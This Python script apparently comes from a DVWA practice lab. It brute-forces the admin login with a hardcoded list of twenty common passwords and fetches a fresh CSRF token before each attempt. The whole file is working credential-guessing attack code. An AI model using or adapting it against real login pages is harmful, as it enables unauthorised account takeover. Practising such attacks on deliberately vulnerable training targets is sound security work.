import os

import requests
from bs4 import BeautifulSoup

from dvwa.utils import get_csrf_token
from dvwa.globals import DVWA_URL


def main():
    url = f"{DVWA_URL}/login.php"
    username = "admin"
    passwords = [
        "123456",
        "123456789",
        "12345678",
        "12345",
        "1234567",
        "admin",
        "qwerty",
        "letmein",
        "welcome",
        "1234",
        "passw0rd",
        "monkey",
        "iloveyou",
        "dragon",
        "sunshine",
        "password",
        "master",
        "trustno1",
        "123qwe",
        "abc123",
    ]

    # Start a session to maintain cookies and handle redirects
    session = requests.Session()

    # Brute-force login attempts
    for password in passwords:
        # Get a fresh CSRF token before each login attempt
        csrf_token = get_csrf_token(session, url)
        print(f"Trying password: {password}")

        data = {
            "username": username,
            "password": password,
            "Login": "Login",
            "user_token": csrf_token,
        }

        response = session.post(url, data=data, allow_redirects=False)

        # Handle the redirection
        if response.status_code == 302:
            redirect_url = response.headers.get("Location")
            if redirect_url:
                # Handle relative redirect URLs
                if not redirect_url.startswith("http"):
                    redirect_url = f"{DVWA_URL}/{redirect_url}"
                final_response = session.get(redirect_url)

                if "Logout" in final_response.text:
                    print(f"[SUCCESS] Password found: {username}:{password}")
                    break
                else:
                    print(f"[Trying {username}:{password}] - Failed")
            else:
                print("Redirect URL not found in response headers.")
        else:
            print(f"[Trying {username}:{password}] - No redirection, failed login.")
    else:
        print("Brute-force attack failed. No matching password found.")


if __name__ == "__main__":
    main()
